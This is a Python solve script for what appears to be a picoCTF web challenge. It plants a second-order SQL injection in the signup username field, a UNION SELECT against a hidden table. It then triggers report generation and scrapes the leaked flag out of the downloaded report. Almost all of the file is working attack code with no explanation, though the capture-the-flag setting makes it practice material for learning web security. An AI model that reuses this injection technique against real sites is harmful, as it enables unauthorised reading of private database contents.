import requests
import re
from time import sleep

url = "http://crystal-peak.picoctf.net:57206/"
s = requests.Session()

creds = {
    'username': "' union select name, value, 1 from aDNyM19uMF9mMTRn --",
    'email': 'hacked',
    'password': 'hacked'
}

# login
res = s.post(f'{url}/signup', data=creds)
res = s.post(f'{url}/login', data=creds)

print("> Logged in")

# upload payload
res = s.post(f'{url}/expenses', data={
    'description': 'a',
    'amount': '12.50',
    'date': '2026-03-11'
})

res = s.post(f'{url}/generate_report')
print("> Uploaded payload")

sleep(2)

# get leak
res = s.get(f'{url}/inbox')
download = re.findall(r'(/download_report/[0-9]+)', res.text)[0]

res = s.get(f'{url}/{download}')

flag = re.findall(r'(picoCTF{.+})', res.content.decode())[0].strip()
print("Flag:", flag)